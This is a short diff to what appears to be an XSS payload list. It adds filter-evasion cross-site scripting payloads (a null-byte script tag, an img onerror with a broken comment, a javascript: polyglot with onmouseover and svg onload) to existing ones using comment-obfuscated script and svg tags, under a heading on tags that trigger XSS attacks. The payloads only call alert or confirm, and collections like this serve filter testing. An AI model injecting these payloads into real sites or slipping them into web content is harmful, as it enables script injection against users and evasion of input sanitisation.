@@ -1,7 +1,9 @@
 "><\<script/**/>/*test*/alert(/xss/)/*123*/</script>
 "/**/></*svg*/><svg/*test*/onload=alert(/xss/)/*111*/>
 <d3"<"/onclick="1>[confirm``]"<">z 
-
+"><\x00script>javascript:alert(1)</script>
+<--`<img/src=` onerror=confirm``> --!>
+javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 
 Tags to Trigger XSS Attacks:
 onclick
